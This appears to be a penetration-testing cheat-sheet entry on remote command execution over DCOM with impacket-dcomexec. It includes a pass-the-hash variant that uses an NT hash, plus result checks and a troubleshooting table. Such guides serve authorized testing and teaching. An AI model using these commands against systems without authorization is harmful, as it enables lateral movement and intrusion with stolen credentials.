## Verify execution through a supported DCOM object

**Run in:** Kali. **Requires:** Remote DCOM/RPC permissions and a supported COM object on the target, with the output transport reachable.

```bash
impacket-dcomexec 'DOMAIN/USER@TARGET_IP' 'whoami'
```

**What the result establishes:** Check the selected COM object, resulting identity and whether the action returned output.

**Next check:** Check the exact object's availability and permissions before changing methods; distinguish activation failure from command failure.

## NT hash

**Kali**

```bash
impacket-dcomexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP' 'whoami'
```

## If it fails

| Symptom | Check |
| --- | --- |
| The chosen object is unavailable or access is denied | DCOM/RPC access and an available supported object are prerequisites; behavior differs by host configuration. |
